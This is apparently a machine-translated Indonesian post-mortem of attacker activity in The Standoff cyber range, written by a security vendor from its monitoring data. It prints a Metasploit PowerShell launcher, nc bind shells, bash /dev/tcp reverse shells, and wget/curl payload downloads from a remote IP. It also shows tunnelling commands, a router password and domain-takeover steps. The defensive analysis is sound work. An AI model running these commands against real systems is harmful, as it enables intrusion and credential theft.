class="hljs-keyword"><span class="hljs-keyword">else</span></span>{<span class="hljs-variable"><span class="hljs-variable">$b</span></span>=<span class="hljs-string"><span class="hljs-string">'powershell.exe'</span></span>};<span class="hljs-variable"><span class="hljs-variable">$s</span></span>=<span class="hljs-built_in"><span class="hljs-built_in">New-Object</span></span> System.Diagnostics.ProcessStartInfo;<span class="hljs-variable"><span class="hljs-variable">$s</span></span>.FileName=<span class="hljs-variable"><span class="hljs-variable">$b</span></span>;<span class="hljs-variable"><span class="hljs-variable">$s</span></span>.Arguments=<span class="hljs-string"><span class="hljs-string">'-noni -nop -w hidden -c &amp;([scriptblock]::create((New-Object IO.StreamReader(New-Object IO.Compression.GzipStream((New-Object IO.MemoryStream([Convert]::FromBase64String('</span></span><span class="hljs-string"><span class="hljs-string">'H4sIAGRK+1...u9uxfACgAA'</span></span><span class="hljs-string"><span class="hljs-string">')))[IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))'</span></span>;<span class="hljs-variable"><span class="hljs-variable">$s</span></span>.UseShellExecute=<span class="hljs-variable"><span class="hljs-variable">$false</span></span>;<span class="hljs-variable"><span class="hljs-variable">$s</span></span>.RedirectStandardOutput=<span class="hljs-variable"><span class="hljs-variable">$true</span></span>;<span class="hljs-variable"><span class="hljs-variable">$s</span></span>.WindowStyle=<span class="hljs-string"><span class="hljs-string">'Hidden'</span></span>;<span class="hljs-variable"><span class="hljs-variable">$s</span></span>.CreateNoWindow=<span class="hljs-variable"><span class="hljs-variable">$true</span></span>;<span class="hljs-variable"><span class="hljs-variable">$p</span></span>=[<span class="hljs-type"><span class="hljs-type">System.Diagnostics.Process</span></span>]::Start(<span class="hljs-variable"><span class="hljs-variable">$s</span></span>);<span class="hljs-string"><span class="hljs-string">""</span></span></code> </pre> <br><br>  Script ini dihasilkan oleh kerangka kerja Metasploit.  Tujuannya adalah untuk membuka soket pada port 55443 untuk mendengarkan dan menjalankan "payload" yang datang ke port ini - mungkin Meterpreter. <br><br><img src="https://habrastorage.org/webt/wn/z6/ds/wnz6dsnq-y0_afhix3hwzux5myi.png"><br><br>  Upaya untuk meluncurkan shell jarak jauh berhasil.  Setelah itu, para penyerang terus mengembangkan serangan dan nama pengguna membuat akun lain dengan nama "vitalik", menambahkan akun ini ke grup "Domain Admin" dan segera setelah pembuatannya, kami melihat login interaktif. <br><br><img src="https://habrastorage.org/webt/3l/dx/iz/3ldxiz4on2lnwl2dfi0jbjaejpq.png"><br><img src="https://habrastorage.org/webt/ai/5p/ja/ai5pja6z1fj4desvnmnsr5mjkx4.png"><br><img src="https://habrastorage.org/webt/yl/nz/g1/ylnzg1plksc4kim1rscff0wfyz8.png"><br><img src="https://habrastorage.org/webt/ul/n3/q0/uln3q0refn34ohp5vgvy71a_dpi.png"><br><br>  Sementara vitalik menciptakan layanan dengan skrip powershell yang sama dengan nama pengguna, nama pengguna secara besar-besaran mereset kata sandi akun domain dan menjadi tertarik pada server mail domain Win2008R2-EXCH yang berdekatan. <br><br>  Aktivitas hampir bersamaan dari nama pengguna dan pengguna vitalik di server domain Exchange (pemindaian dan login) menunjukkan bahwa kemungkinan besar beberapa anggota tim memeriksa jaringan SPUTNIK pada saat yang bersamaan. <br><br><img src="https://habrastorage.org/webt/o3/r1/vb/o3r1vbzjoszizwtyjj319jfowgo.png"><br><img src="https://habrastorage.org/webt/4j/ag/zf/4jagzfgcn94aiacgfrzwzvgvn4o.png"><br><img src="https://habrastorage.org/webt/9f/x3/_1/9fx3_1jvkl4uqssgz68wrf6ldbm.png"><br><br>  vitalik memeriksa ketersediaan server surat dan meluncurkan konsol manajemen server setelah login interaktif. <br><br><img src="https://habrastorage.org/webt/zm/li/2g/zmli2globqjnbfeliqdjxkyd2mm.png"><br><img src="https://habrastorage.org/webt/mm/je/go/mmjegoxoerj7gci7kw2lvhkz6gy.png"><br><br>  Karena tidak menemukan apa pun yang berharga, ia menyeret instrumen dan artileri beratnya ke host Win2008R2-DC - banyak skrip PowerShell dan kerangka kerja BloodHound muncul di pengontrol domain, yang merupakan alat populer untuk pengintaian di jaringan Active Directory.  Untuk mengakses antarmuka web BloodHound, peserta harus menonaktifkan mode terlindungi di IE, yang juga terdeteksi oleh SIEM. <br><br><img src="https://habrastorage.org/webt/u3/ib/u0/u3ibu0j98wyjouwgd_tfuzugafq.png"><br><br>  Aktivitas BloodHound di jaringan tidak dilewati oleh PT NAD.  Salah satu fitur alat ini adalah memindai host di jaringan untuk koneksi aktif.  Lalu lintas ke layanan SRVSVC tersebut terdeteksi oleh salah satu tanda tangan PT NAD dan menunjukkan intelijen di dalam jaringan: <br><br><img src="https://habrastorage.org/webt/zw/j7/9a/zwj79aykwoy3aa3ygbtlifaptzw.png"><br><br>  Sekitar pukul satu pagi, para penyerang, yang sebelumnya membuat salinan bayangan dari disk menggunakan utilitas vssadmin, menyeret database ntds.dit yang berisi semua akun domain.  Setelah berhasil menyelesaikan serangan ini, para penyerang sepenuhnya mengendalikan domain, menerima hash dari akun khusus "krbtgt" yang mereka miliki.  Memiliki akun ini memungkinkan Anda membuat dan menggunakan apa yang disebut.  Golden Ticket - tiket Kerberos untuk akses tak terbatas ke sumber daya di domain, akses ke server atas nama setiap pengguna yang ada dan bahkan tidak ada dan tindakan apa pun dalam domain.  Menggunakan Golden Ticket cukup sulit dideteksi menggunakan peralatan pelindung, tetapi kompromi tautan krbtgt dan ntds.dit jauh lebih mudah dideteksi. <br><br><img src="https://habrastorage.org/webt/is/xb/ko/isxbkotm_hpkchj8wfg6jmb9nqu.png"><br><img src="https://habrastorage.org/webt/oo/k7/69/ook7697a_0mftn0ynebutsrzwwa.png"><br><img src="https://habrastorage.org/webt/tp/dp/-v/tpdp-vl4mvsfelj_wlxzlnqo5ro.png"><br><br>  Tim ini secara bertahap bergerak dari riset domain ke riset jaringan sistem kontrol proses otomatis yang telah dibuka.  Setelah menyeret pemindai Nmap ke karyawan SPUTNIK - YLAVRENTIEV.sputnik.phd dan EPONOMAREV.sputnik.phd, jaringan telah dipindai 172.20.xx. Peserta menggunakan <a href="">nmap_performance.reg</a> untuk mengubah parameter TCP / IP dari tumpukan jendela dan mempercepat pemindaian jaringan kontrol proses. <br><br><img src="https://habrastorage.org/webt/oo/fm/7g/oofm7gzqfy5ze8f1oowfc3lxs-o.png"><br><img src="https://habrastorage.org/webt/2b/pf/pe/2bpfpextzlgkpkcimasndiajhg0.png"><br><br>  Koneksi ke host di sistem kontrol proses otomatis jaringan melalui terowongan di host domain SPUTNIK berbicara sendiri.  Deskripsi tentang apa yang dilakukan peretas di jaringan industri dapat ditemukan di video rekan kami di <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">YouTube</a> . <br><br>  Di antara prestasi lain para penyerang, terowongan lain, sesi ssh, terobosan kreatif setelah malam tanpa tidur pada hari pertama kompetisi, dan tentu saja, penambang game mapan yang menambang mata uang DDOS Coin juga diperhatikan. <br><br><h2>  ZABBIX (100.64.100.161) </h2><br>  Terletak di kantor DMZ # 1 dan dengan bangga melakukan perannya sampai siang hari itu diretas oleh tim yang tidak dikenal. <br><br><img src="https://habrastorage.org/webt/4t/6o/6z/4t6o6zrdsxgxqtuvbwqmucyekjy.png"><br><br>  Tidak sulit untuk menemukan kredensial admin dan tim menggunakan fungsi zabbix bawaan untuk memperluas kemampuan pemantauan tanpa batas menggunakan skrip khusus. <br><br><img src="https://habrastorage.org/webt/rb/_w/xo/rb_wxomfxjzu5-9lx7au5u3lll4.png"><br><br>  Anda dapat menggunakan perintah linux apa pun dalam skrip, yang digunakan oleh tim anggota untuk membuat proksi shell dan Socks. <br><br><pre> <code class="bash hljs"><span class="hljs-built_in"><span class="hljs-built_in">command</span></span>=/bin/nc -e /bin/sh -lp 5432 2&gt;&amp;1 <span class="hljs-built_in"><span class="hljs-built_in">command</span></span>=/bin/ping -c 3 {HOST.CONN} 2&gt;&amp;1 <span class="hljs-built_in"><span class="hljs-built_in">command</span></span>=ls /bin/ <span class="hljs-built_in"><span class="hljs-built_in">command</span></span>=/bin/nc -e /bin/sh -lp 5432 2&gt;&amp;1 <span class="hljs-built_in"><span class="hljs-built_in">command</span></span>=/bin/nc -e /bin/sh -lp 5432 2&gt;&amp;1 <span class="hljs-built_in"><span class="hljs-built_in">command</span></span>=ping 8.8.8.8 <span class="hljs-built_in"><span class="hljs-built_in">command</span></span>=ping 8.8.8.8; netstat -tulpn <span class="hljs-built_in"><span class="hljs-built_in">command</span></span>=ping -n 4 8.8.8.8; netstat -tulpn <span class="hljs-built_in"><span class="hljs-built_in">command</span></span>=ls /tmp/phd <span class="hljs-built_in"><span class="hljs-built_in">command</span></span>=netstat -tulpn <span class="hljs-built_in"><span class="hljs-built_in">command</span></span>=wget http://195.16.61.232:8888/x86_elf -O /tmp; ls /tmp <span class="hljs-built_in"><span class="hljs-built_in">command</span></span>=ls /tmp <span class="hljs-built_in"><span class="hljs-built_in">command</span></span>=curl http://195.16.61.232:8888/x86_elf --output /tmp/tmp.bin;ls /tmp <span class="hljs-built_in"><span class="hljs-built_in">command</span></span>=ping -c 4 195.16.61.232 <span class="hljs-built_in"><span class="hljs-built_in">command</span></span>=touch /tmp/<span class="hljs-built_in"><span class="hljs-built_in">test</span></span>;ls /tmp/ <span class="hljs-built_in"><span class="hljs-built_in">command</span></span>=<span class="hljs-built_in"><span class="hljs-built_in">pwd</span></span> <span class="hljs-built_in"><span class="hljs-built_in">command</span></span>=whoami <span class="hljs-built_in"><span class="hljs-built_in">command</span></span>=ls /var/www/html <span class="hljs-built_in"><span class="hljs-built_in">command</span></span>=<span class="hljs-built_in"><span class="hljs-built_in">which</span></span> nc <span class="hljs-built_in"><span class="hljs-built_in">command</span></span>=curl http://195.16.61.230/PHD/ --output /tmp/tmp.bin; ls /tmp <span class="hljs-built_in"><span class="hljs-built_in">command</span></span>=bash -i &gt;&amp; /dev/tcp/195.16.61.232/8080 0&gt;&amp;1 <span class="hljs-built_in"><span class="hljs-built_in">command</span></span>=chmod u+x /tmp/tmp.bin;/tmp/tmp.bin <span class="hljs-built_in"><span class="hljs-built_in">command</span></span>=bash -i &gt;&amp; /dev/tcp/195.16.61.232/195 &gt;&amp;1 <span class="hljs-built_in"><span class="hljs-built_in">command</span></span>=bash -i &gt;&amp; /dev/tcp/195.16.61.232/1950 0&gt;&amp;1 <span class="hljs-built_in"><span class="hljs-built_in">command</span></span>=bash -i &gt;&amp; /dev/tcp/195.16.61.232/8080 0&gt;&amp;1</code> </pre> <br>  Tim berusaha mengunduh modul dari server di bawah kendali 195.16.61.232, tetapi tidak berhasil: <br><br><img src="https://habrastorage.org/webt/le/d6/t4/led6t46tphox4hnvieokwotovo4.png"><br><br>  Kemudian, setelah sedikit mengeksplorasi lingkungan, saya menginstal bash shell jarak jauh menggunakan alat standar linux dengan server yang sama, mengirimkan paket langsung ke / dev / tcp /. <br><br>  Yang tidak kalah menariknya adalah konten lalu lintas antara tim dan cangkang, yang ditransmisikan secara jernih dan tidak melewati sensor PT NAD. <br><br><pre> <code class="bash hljs">bash-4.2$ /tmp/gost -L socks4a://:1080 &amp; bash-4.2$ gost -L=:54321 -F=10.100.50.48:3389 bash-4.2$ /tmp/gost -L socks4a://:1080 &amp; bash-4.2$ nmap bash: nmap: <span class="hljs-built_in"><span class="hljs-built_in">command</span></span> not found bash-4.2$ ifconfig bash-4.2$ ping 172.30.240.106 bash-4.2$ wget https://gist.githubusercontent.com/sh1n0b1/e2e1a5f63fbec3706123/raw/1bd5f119a7f1e2d4c9328d78686ae79b4e1642f7/linuxprivchecker.py bash-4.2$ python linuxprivchecker.py bash-4.2$ uname -a bash-4.2$ <span class="hljs-built_in"><span class="hljs-built_in">cd</span></span> /etc/cron.daily: bash-4.2$ ./gost -L=tcp://:33899/10.100.50.39:3389 bash-4.2$ ./gost -L=tcp://:4455/10.100.50.39:445 &amp; bash-4.2$ ./gost -L=tcp://:1139/10.100.50.39:139 &amp; bash-4.2$ ./gost -L=tcp://:12345/10.100.60.55:3389 &amp; bash-4.2$ ./gost -L=tcp://:12347/10.100.60.5:445 &amp; bash-4.2$ ./gost -L=tcp://:12348/10.100.60.15:445 &amp; bash-4.2$ ./gost -L=tcp://:12349/10.100.50.100:445 &amp; bash-4.2$ ./gost -L=tcp://:12350/10.100.80.28:445 &amp; bash-4.2$ ./gost -L=tcp://:12351/10.100.80.23:445 &amp; bash-4.2$ ./gost -L=tcp://:12352/10.100.80.30:445 &amp; bash-4.2$ ./gost -L=tcp://:12353/10.100.80.32:445 &amp; bash-4.2$ ./gost -L=tcp://:12354/10.100.80.26:445 &amp; bash-4.2$ ./gost -L=tcp://:12355/10.100.80.5:445 &amp; bash-4.2$ ./gost -L=tcp://:12356/10.100.80.9:445 &amp; bash-4.2$ ./gost -L=tcp://:12357/10.100.80.23:445 &amp; bash-4.2$ ./gost -L=socks5://:1081 &amp;</code> </pre><br>  Seperti yang dapat kita lihat, server ZABBIX terutama digunakan sebagai jembatan untuk pengintaian subnet kantor # 1: 10.100.50.0/24 (Pengguna), 10.100.60.0/24 (Server) dan 10.100.80.0/24 (SecurityTeam). <br><br><h2>  Multiserver (100.64.100.167) </h2><br>  Multiserver adalah host Linux lain di DMZ office # 1 dengan sepasang server HTTP dan database MySQL.  Meskipun multiserver menjadi sasaran pemindaian intensif, hanya ada beberapa serangan yang berhasil.  Tuan rumah berisi kerentanan SambaCry 2017, yang ditemukan setelah kerentanan MS17-010, dan tim mencoba menggunakannya.  Filter PT NAD memungkinkan Anda untuk melokalkan upaya mereka pada timeline: <br><br><img src="https://habrastorage.org/webt/ve/sl/eg/veslegx-lzcod0zrikbkknbtxbg.png"><br><br>  Pemuatan di salah satu upaya perintah # 3 adalah perpustakaan DTECJtAf.so yang dapat dieksekusi.  Dan, dilihat dari nama perpustakaan, anggota tim menggunakan modul is_known_pipename dari Metasploit Framework.  Bukti: <br><br><img src="https://habrastorage.org/webt/c1/5h/ar/c15harpx4hz5ocakhlp8gfq3-q4.png"><br><br>  Selama konfrontasi, para ahli dibantu oleh PT MultiScanner, yang memeriksa semua file yang terbang melalui jaringan yang diketahui oleh PT NAD.  Setelah beberapa saat, ia mengeluarkan vonis kepada DTECJtAf.so yang terbang melalui jaringan: Linux / SmbPayload.C <br><br><img src="https://habrastorage.org/webt/2w/xt/su/2wxtsub8m8u3kkr16dat4nrvk4m.png"><br><br>  Dilihat oleh kurangnya interaksi jaringan lebih lanjut antara server dan perintah # 3, exploit tidak membawa kesuksesan.  Namun, hampir pada saat yang sama, kami melihat sesi SSH aktif dari tim # 4.  Dengan volume lalu lintas yang ditransmisikan, kita dapat menilai bahwa penyerang menggunakan server secara maksimal. <br><br><img src="https://habrastorage.org/webt/s4/bf/ns/s4bfnsifpckisravk3n-nrc-ena.png"><br><br>  Secara umum, login SSH pertama yang berhasil dari pengguna administrator dari tim # 4 terjadi sekitar pukul 3:20 malam hari pertama kompetisi: <br><br><img src="https://habrastorage.org/webt/a5/n-/hk/a5n-hkf4xvwasfati_pi-7x2boe.png"><br><br>  Seperti halnya penyerang yang layak, login diikuti oleh pemeriksaan hak istimewa dan pengintaian pada host: <br><br><img src="https://habrastorage.org/webt/bp/zg/82/bpzg820wnmpyq6s4yrhslo27j4m.png"><br><img src="https://habrastorage.org/webt/hh/vx/7f/hhvx7ftfkizbqpwgdvfiontho-g.png"><br><img src="https://habrastorage.org/webt/37/or/nk/37ornkrlvhslrbgqiqrz2lrdyws.png"><br><img src="https://habrastorage.org/webt/jx/cz/fh/jxczfht677gxcxv8zavm-ngngu0.png"><br><img src="https://habrastorage.org/webt/vg/mo/ji/vgmoji-qysdos0gykutljqu-svc.png"><br><br>  Dan selanjutnya: <br><br><img src="https://habrastorage.org/webt/pn/em/dv/pnemdvcvvnsospf71fayabgznf0.png"><br><img src="https://habrastorage.org/webt/a0/ke/qk/a0keqkukwkssbwt3kjplim5muhg.png"><br><img src="https://habrastorage.org/webt/4s/pb/ga/4spbgaprasyzcv2sbu78xjjl3t8.png"><br><img src="https://habrastorage.org/webt/g2/yx/of/g2yxofrflehddk-g7pffs-fzlw4.png"><br><br>  Dengan mudah, kami melakukan atribusi penyerang berdasarkan bahasa: <br><br><img src="https://habrastorage.org/webt/zs/e6/xh/zse6xhfmkaibmxyptu4cdhabc6i.png"><br><br>  Multiserver tidak menerima konfigurasi yang tepat dan tidak diketahui pasti apa upaya lain yang dilakukan tim.  Dilihat oleh log yang tersedia, host ini, serta host lain di kantor DMZ # 1, berfungsi sebagai titik awal untuk menjelajahi infrastruktur internal kantor. <br><br><h2>  Mis </h2><br>  Tuan rumah lainnya juga menjadi fokus perhatian tim.  Misalnya, para peserta berperilaku aneh dalam kaitannya dengan router Mikrotik di 100.64.100.237 di jaringan DMZ Office # 1.  Sekitar jam 2 pagi pada hari kedua konfrontasi, login yang berhasil ke konsol konsol dari router Telnet dengan pasangan ‚Äúadmin: VxPvRxX74e8xrbia77hsi7WKm‚Äù berhasil.  Versi firmware perangkat adalah 6.38.4 - ini adalah versi yang diuji Chimay Red Stack Clash yang terkenal untuk Mikrotik diuji, yang memungkinkan untuk mengeksekusi kode apa pun pada perangkat, dan, khususnya, untuk mengekstrak kata sandi pengguna pada router.  Kerentanan eksploitasi telah ditemukan oleh PT NAD. <br><br>  Tapi kemudian, di area makan siang, tim yang pertama kali mengambil router memutuskan untuk menutup lubang dengan pembaruan firmware sederhana dan memonopoli akses: <br><br><img src="https://habrastorage.org/webt/p-/kj/-m/p-kj-mpfwkryznwmnwcvppojmk0.png"><br><br>  Ini adalah salah satu dari sedikit contoh di mana tim peserta menutup lubang di sistem sehingga tim lain tidak dapat menangkap tuan rumah ini. <br><br>  PT MultiScanner telah mendeteksi peristiwa yang aneh: <br><br><img src="https://habrastorage.org/webt/fn/vg/hm/fnvghm_xf8wqwb6y0ygw7obra_m.jpeg"><br><br>  Untuk mengakses bank, tim dapat menggunakan klien bank yang tersedia di situs.  Situs ini terletak di jaringan perbankan di bawah pengawasan tim pembela dan mereka <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">membangun</a> klien menggunakan kerangka kerja Metasploit dan menggantinya dengan yang asli.  Untungnya bagi para pembela HAM, klien yang sudah terpasang diunduh oleh beberapa tim, seperti yang kita lihat di tangkapan layar PT MultiScanner di atas.  Tidak ada koneksi yang berhasil diketahui, tetapi kasus ini layak disebutkan, karena skenario seperti itu terjadi dalam kehidupan biasa - program Trojan penyerang di situs web resmi atau mengganti pembaruan untuk meluncurkan serangan pada klien. <br><br><h2>  Penambang </h2><br>  Inovasi lain dalam The Standoff adalah munculnya penambang game.  Menurut legenda, tim dapat menggunakan server yang ditangkap sebagai penambang, yang memberi mereka poin tambahan.  Alih-alih cryptocurrency tradisional, mereka menambang DDoS Coin - mata uang yang setara dengan upaya yang dihabiskan untuk serangan DDoS pada server.  Data dari jabat tangan 1.2 TLS berfungsi sebagai Bukti Kerja dan semakin banyak penambang membuat jabat tangan TLS dengan server target, semakin tinggi kemungkinannya untuk menemukan blok baru dan menerima hadiahnya dari penyelenggara serangan DDoS. <br><br>  Klien ditulis dalam Go dan dapat bekerja pada Windows dan Linux.  Ide ini diterapkan untuk pertama kalinya dan, meskipun tidak semua tim berhasil menerapkannya, upaya untuk meluncurkannya terlihat di banyak server dari infrastruktur game: <br><br><img src="https://habrastorage.org/webt/ea/sb/lf/easblf9r9rzmlqwyyxp56olu_r0.png"><br><br>  Mencoba menjalankan penambang pada simpul Joomla (100.64.154.147) <br><br><img src="https://habrastorage.org/webt/_w/j0/um/_wj0umbbybcwaaw_t52vbpcl8v0.png"><br><br>  Menjalankan penambang dari infrastruktur SPUTNIK (10.106.60.0/24) <br><br><img src="https://habrastorage.org/webt/t-/9g/vd/t-9gvdd4vgnokiwbs1jwn5uheau.png"><br><br>  Sebagai bagian dari permainan, tim dapat menambang cryptocurrency dan menukarnya dengan poin game.  Setengah dari tim berhasil menggunakan server yang ditangkap sebelumnya untuk mengekstrak blok.  Ada juga komponen pertukaran dalam logika game - dengan perubahan tajam dalam jumlah mata uang yang ditambang, nilai tukarnya menurun.  Dengan demikian, dimungkinkan untuk melakukan operasi spekulatif dan mendapatkan poin tanpa menyelesaikan tugas dasar.  Tetapi karena ide ini sebelumnya tidak diterapkan dalam permainan seperti itu, tim tidak dapat menggunakannya dengan benar dan ini tidak secara signifikan mempengaruhi jalannya permainan. <br><br>  Dalam hal jumlah blok yang ditambang, tim CARKA Kazakhstani memimpin, yang merupakan yang pertama meluncurkan penambang di infrastruktur game.  Di sini kami dapat beralih dari nomor jaringan tim ke nama mereka karena fakta bahwa pengidentifikasi mereka menyertakan informasi tentang blok dan diperhitungkan saat menghitungnya.  Secara umum, idenya terbukti baik, dan pasti bisa dilihat di The Standoff berikutnya. <br><br><h2>  Alih-alih output </h2><br>  Kebuntuan Terakhir adalah panas - 12 tim aktif mengeksplorasi dan meretas infrastruktur kota.  Produk kami memungkinkan kami untuk "memata-matai" bagaimana tepatnya para peserta permainan bertindak, taktik dan alat apa yang mereka pilih dan apa yang menjadi tujuan mereka.  Kami menyaksikan bagaimana mereka berinteraksi dengan infrastruktur domain kantor, dimulai dengan infeksi satu mesin dan berakhir dengan perebutan seluruh domain dan transisi ke jaringan ACS berikutnya.  Selama acara seperti The Standoff, produk memiliki beban yang sangat besar: MaxPatrol SIEM menangani 20.000 EPS, dan PT NAD memproses lebih dari 3 terabyte lalu lintas jaringan di kedua hari tersebut, belum lagi infrastruktur jaringan itu sendiri: router, switch, dan firewall. <br><br>  Kompromi kantor virtual semacam itu dapat terjadi dengan kantor nyata tanpa sarana perlindungan dan kontrol yang tepat.  Sebagai aturan, ini mengarah pada kebocoran data berharga seperti korespondensi, data keuangan dan data pribadi karyawan / pengguna. <br><br>  Di antara pemindaian yang tak berujung, binatang buas, dan upaya untuk mengeksploitasi semua jenis kerentanan, produk membantu menentukan bagaimana server infrastruktur game diretas.  Serangan dan jejak kompromi yang berhasil seperti kerang web, konsol jarak jauh, terowongan, dan info masuk host ditentukan.  Semua ini membantu para ahli membuat produk lebih baik. <br><br><img src="https://habrastorage.org/webt/aw/mk/24/awmk245o6p1ousad7r_aqj_kcni.png"><br><br>  Dalam tangkapan layar statistik tentang koneksi VPN tim selama permainan, Anda dapat melihat bagaimana internasional The Standoff adalah: Koneksi VPN dibuat dengan server di Amerika Serikat, Kazakhstan, Belanda, dan separuh Eropa!  Ngomong-ngomong, tidak ada tim dari Amerika atau Eropa di The Standoff, tetapi ada satu tim dari Kazakhstan. </div></div><p>Source: <a rel="nofollow" href="https://habr.com/ru/post/id418335/">https://habr.com/ru/post/id418335/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../id418323/index.html">Sedikit tentang atribut host, keyboard, kode, dan SCS dalam seri "World of the Wild West" (Westworld)</a></li>
<li><a href="../id418327/index.html">Pembuat sepatu dengan sepatu bot: yang dipilih oleh para ahli smartphone untuk mereka sendiri</a></li>
<li><a href="../id418329/index.html">Organisasi pengujian yang aman dalam produksi. Bagian 2</a></li>
<li><a href="../id418331/index.html">Master server dan jaringan - selamat berlibur</a></li>
<li><a href="../id418333/index.html">Robot Uber kembali ke jalan, tetapi orang-orang akan mengendarainya</a></li>
<li><a href="../id418337/index.html">Panas, Musim Panas DataGrip 2018.2</a></li>
<li><a href="../id418339/index.html">Manipulasi "manual"</a></li>
<li><a href="../id418341/index.html">Selamat Hari Administrator Sistem! Kartu ucapan dengan makna</a></li>
<li><a href="../id418345/index.html">Dokumentasi format pertukaran informasi - mudah dan sederhana</a></li>
<li><a href="../id418347/index.html">Bagaimana saya menulis library C ++ 11 standar atau mengapa boost sangat menakutkan. Bab 4.3</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter57283870 = new Ya.Metrika({
                  id:57283870,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/57283870" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-6', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Weekly-Geekly ES | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=9uU9J9pq8z7k8xEBHYSfs6DenIBAHs3vLIHcPIJW9d0&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>